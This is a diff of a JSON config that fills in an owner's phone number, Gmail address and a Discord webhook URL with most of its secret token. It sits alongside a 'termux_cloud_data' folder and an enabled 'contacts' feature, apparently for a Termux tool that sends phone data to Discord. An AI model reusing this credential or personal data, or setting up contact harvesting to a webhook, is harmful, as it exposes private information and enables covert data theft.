@@ -1,9 +1,9 @@
 {
     "owner": {
-        "phone": "+94771234567",
-        "email": "owner@gmail.com"
+        "phone": "+94789729806",
+        "email": "rpinfinix76@gmail.com"
     },
-    "webhook_url": "https://discord.com/api/webhooks/...",
+    "webhook_url": "https://discord.com/api/webhooks/1534669144203726892/HwUIWjGeYCrXE564BfQgH-93CN-04cUw6gEZf0quksk6mA-Y2HukIEZ75YYBMoh_9rjY...",
     "cloud_folder": "termux_cloud_data",
     "features": {
         "contacts": true,
